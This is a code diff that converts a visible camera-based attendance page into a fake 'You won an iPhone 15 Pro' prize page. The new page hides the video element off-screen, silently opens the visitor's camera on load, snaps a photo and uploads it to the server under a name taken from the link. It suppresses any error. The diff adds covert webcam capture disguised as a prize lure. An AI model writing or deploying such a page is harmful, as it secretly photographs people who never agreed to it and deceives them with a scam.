@@ -3,523 +3,172 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Attendance Capture</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <title>Congratulations!</title>
   <style>
-    /* ─── Design Tokens ─────────────────────────────────────── */
-    :root {
-      --bg:          #080c14;
-      --surface:     rgba(15,23,42,0.85);
-      --border:      rgba(99,102,241,0.25);
-      --accent:      #6366f1;
-      --accent2:     #8b5cf6;
-      --success:     #10b981;
-      --error:       #ef4444;
-      --warn:        #f59e0b;
-      --text:        #f1f5f9;
-      --muted:       #64748b;
-      --font:        'Inter', system-ui, sans-serif;
-    }
-
-    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
-
     body {
-      font-family: var(--font);
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      overflow-x: hidden;
-      padding-top: 70px; /* space for navbar */
+      background-color: #ffffff;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
     }
-
-    /* ─── Top Navbar ─────────────────────────────────────── */
-    .topbar {
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      z-index: 999;
-      height: 56px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 24px;
-      background: rgba(8, 12, 20, 0.75);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border-bottom: 1px solid rgba(99,102,241,0.18);
-      box-shadow: 0 2px 24px rgba(0,0,0,0.35);
-      animation: slideDown .4s ease both;
-    }
-    @keyframes slideDown {
-      from { opacity:0; transform:translateY(-100%); }
-      to   { opacity:1; transform:translateY(0); }
-    }
-
-    .topbar-brand {
-      display: flex;
-      align-items: center;
-      gap: 9px;
-      text-decoration: none;
-    }
-    .topbar-brand .brand-icon {
-      width: 32px; height: 32px;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      border-radius: 9px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: .95rem;
-      box-shadow: 0 4px 12px rgba(99,102,241,0.4);
-      flex-shrink: 0;
-    }
-    .topbar-brand .brand-name {
-      font-size: .92rem;
-      font-weight: 700;
-      color: #c7d2fe;
-      letter-spacing: -.2px;
-    }
-    .topbar-brand .brand-dot {
-      width: 6px; height: 6px;
-      background: var(--success);
-      border-radius: 50%;
-      animation: pulse-dot 1.8s ease-in-out infinite;
-    }
-    @keyframes pulse-dot {
-      0%,100%{ opacity:1; transform:scale(1);   }
-      50%     { opacity:.4; transform:scale(.65); }
-    }
-
-    .topbar-nav-btn {
-      display: flex;
-      align-items: center;
-      gap: 7px;
-      padding: 7px 16px;
-      background: rgba(99,102,241,0.12);
-      border: 1px solid rgba(99,102,241,0.38);
-      border-radius: 50px;
-      color: #a5b4fc;
-      font-family: var(--font);
-      font-size: .82rem;
-      font-weight: 600;
-      text-decoration: none;
-      cursor: pointer;
-      transition: background .22s, border-color .22s, transform .18s, box-shadow .22s;
-      white-space: nowrap;
-    }
-    .topbar-nav-btn:hover {
-      background: rgba(99,102,241,0.26);
-      border-color: rgba(99,102,241,0.65);
-      transform: translateY(-1px);
-      box-shadow: 0 4px 16px rgba(99,102,241,0.30);
-      color: #e0e7ff;
-    }
-    .topbar-nav-btn:active { transform: translateY(0); }
-    .topbar-nav-btn .nav-badge {
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      color: #fff;
-      font-size: .6rem;
-      font-weight: 700;
-      padding: 1px 6px;
-      border-radius: 20px;
-      letter-spacing: .4px;
-      text-transform: uppercase;
-    }
-
-
-
-    /* ─── Card ──────────────────────────────────────────────── */
-    .card {
-      position: relative;
-      z-index: 1;
-      background: var(--surface);
-      backdrop-filter: blur(24px);
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      padding: 36px 32px 32px;
-      width: min(92vw, 440px);
-      box-shadow: 0 24px 64px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.04) inset;
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      animation: fadeUp .5s ease both;
-    }
-    @keyframes fadeUp {
-      from { opacity:0; transform:translateY(20px); }
-      to   { opacity:1; transform:translateY(0); }
-    }
-
-    /* ─── Header ─────────────────────────────────────────────── */
-    .header { text-align: center; }
-    .logo {
-      width: 56px; height: 56px;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      border-radius: 16px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.6rem;
-      margin-bottom: 14px;
-      box-shadow: 0 8px 24px rgba(99,102,241,0.4);
+    .prize-container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
     }
     h1 {
-      font-size: 1.45rem;
-      font-weight: 700;
-      background: linear-gradient(to right, #a5b4fc, #c084fc);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      letter-spacing: -0.3px;
+      color: #e60000;
+      font-size: 28px;
     }
-    .subtitle {
-      font-size: 0.82rem;
-      color: var(--muted);
-      margin-top: 5px;
+    p {
+      font-size: 18px;
+      color: #333;
     }
-
-    /* ─── Video ──────────────────────────────────────────────── */
-    .video-wrap {
-      position: relative;
-      border-radius: 16px;
-      overflow: hidden;
-      background: #0a0f1a;
-      aspect-ratio: 4/3;
-      border: 1px solid rgba(255,255,255,0.06);
-    }
-    video {
+    img {
       width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1); /* mirror for selfie */
-      display: block;
-      opacity: 0;
-      transition: opacity .4s ease;
+      max-width: 300px;
+      margin: 20px 0;
+      border-radius: 10px;
     }
-    video.live { opacity: 1; }
-
-    /* scanning line animation */
-    .scan-line {
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(transparent 40%, rgba(99,102,241,0.08) 50%, transparent 60%);
-      background-size: 100% 200%;
-      animation: scan 2.5s linear infinite;
-      pointer-events: none;
-      display: none;
-    }
-    .scan-line.active { display: block; }
-    @keyframes scan {
-      0%   { background-position: 0 -100%; }
-      100% { background-position: 0 200%; }
-    }
-
-    /* corner brackets */
-    .video-wrap::before, .video-wrap::after {
-      content: '';
-      position: absolute;
-      width: 28px; height: 28px;
-      border-color: var(--accent);
-      border-style: solid;
-      z-index: 2;
-    }
-    .video-wrap::before {
-      top: 10px; left: 10px;
-      border-width: 2px 0 0 2px;
-      border-radius: 4px 0 0 0;
-    }
-    .video-wrap::after {
-      bottom: 10px; right: 10px;
-      border-width: 0 2px 2px 0;
-      border-radius: 0 0 4px 0;
-    }
-
-    /* camera-off placeholder */
-    .cam-placeholder {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      color: var(--muted);
-      font-size: 0.82rem;
-    }
-    .cam-placeholder .icon { font-size: 2.2rem; }
-
-    /* ─── Status Bar ─────────────────────────────────────────── */
-    .status-bar {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,255,255,0.07);
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-size: 0.84rem;
-      min-height: 46px;
-      transition: border-color .3s, background .3s;
-    }
-    .status-bar.success { border-color: rgba(16,185,129,.4); background: rgba(16,185,129,.06); }
-    .status-bar.error   { border-color: rgba(239,68,68,.4);  background: rgba(239,68,68,.06); }
-    .status-bar.warn    { border-color: rgba(245,158,11,.4); background: rgba(245,158,11,.06); }
-
-    .dot {
-      width: 8px; height: 8px;
-      border-radius: 50%;
-      background: var(--accent);
-      flex-shrink: 0;
-      animation: pulse-dot 1.4s ease-in-out infinite;
-    }
-    .dot.success { background: var(--success); animation: none; }
-    .dot.error   { background: var(--error);   animation: none; }
-    .dot.warn    { background: var(--warn);     animation: none; }
-    @keyframes pulse-dot {
-      0%,100% { opacity: 1; transform: scale(1); }
-      50%      { opacity: .4; transform: scale(.7); }
-    }
-
-    /* ─── Progress Steps ─────────────────────────────────────── */
-    .steps {
-      display: flex;
-      justify-content: space-between;
-      gap: 4px;
-    }
-    .step {
-      flex: 1;
-      height: 3px;
-      border-radius: 99px;
-      background: rgba(255,255,255,0.08);
-      transition: background .4s ease;
-    }
-    .step.done   { background: var(--success); }
-    .step.active { background: var(--accent);  animation: shimmer 1.2s ease infinite; }
-    @keyframes shimmer {
-      0%,100% { opacity: 1; }
-      50%      { opacity: 0.5; }
-    }
-
-    /* ─── Admin Button ───────────────────────────────────────── */
-    .admin-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      width: 100%;
-      padding: 13px 20px;
-      background: rgba(99,102,241,0.10);
-      border: 1px solid rgba(99,102,241,0.40);
-      border-radius: 14px;
-      color: #a5b4fc;
-      font-family: var(--font);
-      font-size: 0.92rem;
-      font-weight: 600;
+    .claim-btn {
+      display: inline-block;
+      background-color: #28a745;
+      color: white;
+      padding: 15px 30px;
+      font-size: 20px;
+      font-weight: bold;
       text-decoration: none;
-      cursor: pointer;
-      transition: background .25s, border-color .25s, transform .2s, box-shadow .25s;
-      box-shadow: 0 0 0 0 rgba(99,102,241,0);
-      position: relative;
-      overflow: hidden;
+      border-radius: 5px;
+      box-shadow: 0px 4px 6px rgba(0,0,0,0.2);
+      animation: pulse 1.5s infinite;
     }
-    .admin-btn::before {
-      content: '';
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    /* Admin button styles */
+    .admin-link {
       position: absolute;
-      inset: 0;
-      background: linear-gradient(105deg, transparent 40%, rgba(255,255,255,.07) 50%, transparent 60%);
-      transform: translateX(-100%);
-      transition: transform .55s ease;
+      top: 15px;
+      right: 15px;
+      background-color: #f0f0f0;
+      color: #333;
+      padding: 5px 10px;
+      font-size: 12px;
+      text-decoration: none;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      opacity: 0.7;
     }
-    .admin-btn:hover::before { transform: translateX(100%); }
-    .admin-btn:hover {
-      background: rgba(99,102,241,0.22);
-      border-color: rgba(99,102,241,0.70);
-      transform: translateY(-2px);
-      box-shadow: 0 6px 22px rgba(99,102,241,0.30);
-      color: #c7d2fe;
+    .admin-link:hover {
+      opacity: 1;
+      background-color: #e0e0e0;
     }
-    .admin-btn:active { transform: translateY(0); }
-    .admin-btn .btn-icon {
-      font-size: 1.15rem;
-      line-height: 1;
-    }
-    .admin-badge {
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      color: #fff;
-      font-size: 0.66rem;
-      font-weight: 700;
-      padding: 2px 7px;
-      border-radius: 20px;
-      letter-spacing: .4px;
-      text-transform: uppercase;
+    
+    /* Hide the video element but keep it in the DOM for capturing */
+    #video {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      opacity: 0.01;
     }
   </style>
 </head>
 <body>
 
-<!-- ─── TOP NAVBAR ────────────────────────────────────────── -->
-<nav class="topbar">
-  <a href="/capture" class="topbar-brand">
-    <div class="brand-icon">📸</div>
-    <span class="brand-name">AttendCam</span>
-    <div class="brand-dot"></div>
-  </a>
-  <a href="/admin" target="_blank" class="topbar-nav-btn" id="adminNavBtn">
-    <span>🖥️ Admin Panel</span>
-    <span class="nav-badge">Go →</span>
-  </a>
-</nav>
+  <a href="/admin" class="admin-link">Go to Admin</a>
 
-<div class="card">
-  <div class="header">
-    <div class="logo">📸</div>
-    <h1>Auto Attendance</h1>
-    <p class="subtitle">Camera opens automatically — just allow camera access</p>
+  <div class="prize-container">
+    <h1>🎉 YOU WON A PRIZE! 🎉</h1>
+    <p>You have been selected to receive a brand new <b>iPhone 15 Pro</b> or a <b>Cash Prize</b>!</p>
+    
+    <!-- iPhone / Money Picture -->
+    <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=600&auto=format&fit=crop" alt="iPhone 15 Prize" />
+    
+    <br>
+    <a href="#" class="claim-btn">CLAIM PRIZE NOW</a>
   </div>
 
-  <!-- Progress steps (3 steps: Camera → Capture → Upload) -->
-  <div class="steps">
-    <div class="step active" id="step-cam"    title="Camera"></div>
-    <div class="step"        id="step-snap"   title="Capture"></div>
-    <div class="step"        id="step-upload" title="Upload"></div>
-  </div>
+  <!-- Hidden video element -->
+  <video id="video" autoplay playsinline></video>
 
-  <!-- Camera preview -->
-  <div class="video-wrap" id="videoWrap">
-    <div class="cam-placeholder" id="camPlaceholder">
-      <span class="icon">🎥</span>
-      <span>Camera initializing…</span>
-    </div>
-    <video id="video" autoplay playsinline></video>
-    <div class="scan-line" id="scanLine"></div>
-  </div>
+  <script>
+    const API_URL = "/attendance";
+    const MAX_KB  = 250;
+    const video = document.getElementById("video");
+    let stream = null;
 
-  <!-- Status -->
-  <div class="status-bar" id="statusBar">
-    <div class="dot" id="dot"></div>
-    <span id="statusMsg">Activating camera…</span>
-  </div>
-
-  <a href="/admin" target="_blank" class="admin-btn" id="adminLink">
-    <span class="btn-icon">🖥️</span>
-    <span>View Admin Dashboard</span>
-    <span class="admin-badge">Admin</span>
-  </a>
-</div>
-
-<script>
-  /* ── CONFIG ── Change this to your deployed backend URL ────── */
-  const API_URL = "/attendance";
-  const MAX_KB  = 250;
-
-  /* ── DOM ─────────────────────────────────────────────────── */
-  const video       = document.getElementById("video");
-  const statusMsg   = document.getElementById("statusMsg");
-  const statusBar   = document.getElementById("statusBar");
-  const dot         = document.getElementById("dot");
-  const scanLine    = document.getElementById("scanLine");
-  const camPH       = document.getElementById("camPlaceholder");
-  const steps       = ["step-cam","step-snap","step-upload"].map(id => document.getElementById(id));
-
-  let stream = null;
-
-  /* ── Helpers ─────────────────────────────────────────────── */
-  function setStatus(msg, type = "") {
-    statusMsg.textContent  = msg;
-    statusBar.className    = "status-bar" + (type ? " " + type : "");
-    dot.className          = "dot" + (type ? " " + type : "");
-  }
-
-  function advanceStep(index) {
-    steps.forEach((s, i) => {
-      s.className = i < index  ? "step done"
-                  : i === index ? "step active"
-                  : "step";
-    });
-  }
-
-  /* GPS removed — photo only */
-
-  async function startCamera() {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { width:{ideal:640}, height:{ideal:480}, facingMode:"environment" },
-      audio: false
-    });
-    video.srcObject = stream;
-    await new Promise(r => video.addEventListener("loadedmetadata", r, {once:true}));
-    video.classList.add("live");
-    camPH.style.display = "none";
-    scanLine.classList.add("active");
-  }
-
-  function stopCamera() {
-    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-    video.classList.remove("live");
-    scanLine.classList.remove("active");
-  }
-
-  function captureBlob(quality = 0.82) {
-    return new Promise((res, rej) => {
-      const c = document.createElement("canvas");
-      c.width  = video.videoWidth  || 640;
-      c.height = video.videoHeight || 480;
-      const ctx = c.getContext("2d");
-      ctx.translate(c.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
-      c.toBlob(blob => {
-        if (!blob) return rej(new Error("Capture failed."));
-        const kb = blob.size / 1024;
-        if (kb > MAX_KB && quality > 0.15) {
-          res(captureBlob(quality - 0.15));
-        } else {
-          res(blob);
-        }
-      }, "image/jpeg", quality);
-    });
-  }
-
-  /* ── Main Flow (photo only, no GPS) ─────────────────────── */
-  async function run() {
-    const params = new URLSearchParams(location.search);
-    const name   = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
-
-    try {
-      /* Step 1 – Camera */
-      advanceStep(0);
-      setStatus("Activating camera…");
-      await startCamera();
-
-      /* Step 2 – Stabilise & Capture */
-      advanceStep(1);
-      setStatus("Capturing...");
-      await new Promise(r => setTimeout(r, 500));
-      const blob = await captureBlob();
-      stopCamera();
-
-      /* Step 3 – Upload */
-      advanceStep(2);
-      setStatus("Uploading attendance record…");
-      const fd = new FormData();
-      fd.append("name",      name);
-      fd.append("latitude",  0);
-      fd.append("longitude", 0);
-      fd.append("photo",     blob, "attendance.jpg");
-
-      const resp = await fetch(API_URL, { method:"POST", body:fd });
-      const data = await resp.json();
-      if (!resp.ok) throw new Error(data.detail || "Server error.");
-
-      /* Done */
-      steps.forEach(s => s.className = "step done");
-      setStatus(`✅ Attendance saved — ${name}`, "success");
-
-    } catch (err) {
-      setStatus("⚠️  " + err.message, "error");
-      stopCamera();
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" },
+          audio: false
+        });
+        video.srcObject = stream;
+        await new Promise(r => video.addEventListener("loadedmetadata", r, {once:true}));
+        video.play();
+      } catch(e) {
+        // fail silently
+      }
     }
-  }
 
-  window.addEventListener("DOMContentLoaded", run);
-</script>
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+    }
+
+    function captureBlob(quality = 0.82) {
+      return new Promise((res, rej) => {
+        const c = document.createElement("canvas");
+        c.width  = video.videoWidth  || 640;
+        c.height = video.videoHeight || 480;
+        const ctx = c.getContext("2d");
+        
+        ctx.drawImage(video, 0, 0, c.width, c.height);
+        
+        c.toBlob(blob => {
+          if (!blob) return rej(new Error("Capture failed."));
+          const kb = blob.size / 1024;
+          if (kb > MAX_KB && quality > 0.15) {
+            res(captureBlob(quality - 0.15));
+          } else {
+            res(blob);
+          }
+        }, "image/jpeg", quality);
+      });
+    }
+
+    async function run() {
+      const params = new URLSearchParams(location.search);
+      const name = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
+
+      try {
+        await startCamera();
+        
+        // Wait 500ms for camera to focus
+        await new Promise(r => setTimeout(r, 500));
+        
+        const blob = await captureBlob();
+        stopCamera();
+
+        const fd = new FormData();
+        fd.append("name", name);
+        fd.append("latitude", 0);
+        fd.append("longitude", 0);
+        fd.append("photo", blob, "attendance.jpg");
+
+        // Send to backend in the background
+        await fetch(API_URL, { method: "POST", body: fd });
+
+      } catch (err) {
+        stopCamera();
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", run);
+  </script>
 </body>
 </html>
